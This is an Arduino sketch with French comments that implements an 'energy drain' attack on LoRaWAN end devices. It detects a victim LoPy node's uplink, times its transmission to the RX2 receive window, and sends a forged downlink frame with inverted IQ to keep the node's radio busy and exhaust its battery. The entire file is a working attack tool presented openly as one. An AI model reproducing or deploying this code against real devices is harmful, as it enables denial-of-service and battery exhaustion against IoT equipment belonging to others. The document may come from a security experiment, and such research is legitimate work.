#include <SPI.h>
#include <LoRa.h>

// ===== CONFIGURATION =====
const float FREQ_VICTIME = 868.3;    // Fréquence d'écoute (Uplink LoPy)
const float FREQ_ATTAQUE = 869.525;  // Fréquence d'envoi (Fenêtre RX2 LoRaWAN)
const int SF = 7;                    // Doit correspondre au DR5 du LoPy (SF7)
const long BW = 125E3;
const int SYNC_WORD = 0x34;          // Réseaux publics (LoRaWAN)

void setup() {
  Serial.begin(115200);
  while (!Serial);

  Serial.println("--- ATTAQUANT ENERGY DRAIN ---");
  
  if (!LoRa.begin(FREQ_VICTIME * 1E6)) {
    Serial.println("Erreur LoRa");
    while (1);
  }

  // Configuration initiale pour l'écoute
  LoRa.setSpreadingFactor(SF);
  LoRa.setSignalBandwidth(BW);
  LoRa.setSyncWord(SYNC_WORD);
  
  Serial.print("En attente d'un signal sur ");
  Serial.print(FREQ_VICTIME);
  Serial.println(" MHz...");
}

void loop() {
  // 1. DÉTECTION DE L'UPLINK
  int packetSize = LoRa.parsePacket();
  if (packetSize) {
    unsigned long detectionTime = millis();
    Serial.println(">>> Uplink victime détecté !");
    
    // 2. SYNCHRONISATION (Timing RX2)
    // On attend la fenêtre RX2 qui s'ouvre à +2000ms.
    // On soustrait un petit délai pour compenser le temps de traitement
    delay(1950); 

    // 3. EXÉCUTION DE L'ATTAQUE
    envoyerPaquetMalveillant();
    
    // 4. RÉINITIALISATION
    LoRa.setFrequency(FREQ_VICTIME * 1E6);
    LoRa.disableInvertIQ(); // On repasse en mode écoute normale
    Serial.println("Retour en mode écoute...");
  }
}

void envoyerPaquetMalveillant() {
  Serial.println("Envoi du paquet de drain sur RX2...");
  
  LoRa.setFrequency(FREQ_ATTAQUE * 1E6);
  
  // CRUCIAL : Pour qu'un Node (LoPy) reçoive un message, 
  // l'émetteur doit inverser le signal IQ (comme une Gateway)
  LoRa.enableInvertIQ(); 
  
  LoRa.beginPacket();
  
  // Construction d'une trame LoRaWAN factice (Downlink)
  uint8_t dummy_frame[] = { 
    0x60,               // MHDR: Unconfirmed Data Down
    0x26, 0x01, 0x1A, 0x80, // DevAddr (peu importe ici pour le drain)
    0x00,               // FCtrl
    0x00, 0x01,         // FCnt
    0x01,               // FPort
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF // Payload longue
  };
  
  LoRa.write(dummy_frame, sizeof(dummy_frame));
  LoRa.endPacket();
  
  Serial.println("Attaque envoyée !");
}
